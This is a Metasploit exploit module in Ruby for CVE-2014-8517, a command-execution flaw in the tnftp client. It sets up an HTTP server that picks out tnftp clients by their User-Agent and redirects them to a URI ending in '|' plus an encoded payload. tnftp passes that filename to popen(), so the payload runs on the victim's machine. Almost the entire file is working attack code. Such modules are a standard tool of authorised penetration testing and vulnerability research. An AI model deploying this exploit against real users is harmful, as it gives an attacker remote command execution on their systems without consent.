# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;tnftp "savefile" Arbitrary Command Execution&#039;,
      &#039;Description&#039; => %q{
        This module exploits an arbitrary command execution vulnerability in
        tnftp&#039;s handling of the resolved output filename - called "savefile" in
        the source - from a requested resource.

        If tnftp is executed without the -o command-line option, it will resolve
        the output filename from the last component of the requested resource.

        If the output filename begins with a "|" character, tnftp will pass the
        fetched resource&#039;s output to the command directly following the "|"
        character through the use of the popen() function.
      },
      &#039;Author&#039; => [
        &#039;Jared McNeill&#039;, # Vulnerability discovery
        &#039;wvu&#039; # Metasploit module
      ],
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2014-8517&#039;],
        [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2014/q4/459&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Oct 28 2014&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => &#039;unix&#039;,
      &#039;Arch&#039; => ARCH_CMD,
      &#039;Privileged&#039; => false,
      &#039;Payload&#039; => {&#039;BadChars&#039; => &#039;/&#039;},
      &#039;Targets&#039; => [[&#039;ftp(1)&#039;, {}]],
      &#039;DefaultTarget&#039; => 0
    ))
  end

  def on_request_uri(cli, request)
    unless request[&#039;User-Agent&#039;] =~ /(tn|NetBSD-)ftp/
      print_status("#{request[&#039;User-Agent&#039;]} connected")
      send_not_found(cli)
      return
    end

    if request.uri.ends_with?(sploit)
      send_response(cli, &#039;&#039;)
      print_good("Executing `#{payload.encoded}&#039;!")
      report_vuln(
        :host => cli.peerhost,
        :name => self.name,
        :refs => self.references,
        :info => request[&#039;User-Agent&#039;]
      )
    else
      print_status("#{request[&#039;User-Agent&#039;]} connected")
      print_status(&#039;Redirecting to exploit...&#039;)
      send_redirect(cli, sploit_uri)
    end
  end

  def sploit_uri
    (get_uri.ends_with?(&#039;/&#039;) ? get_uri : "#{get_uri}/") +
      Rex::Text.uri_encode(sploit, &#039;hex-all&#039;)
  end

  def sploit
    "|#{payload.encoded}"
  end
end

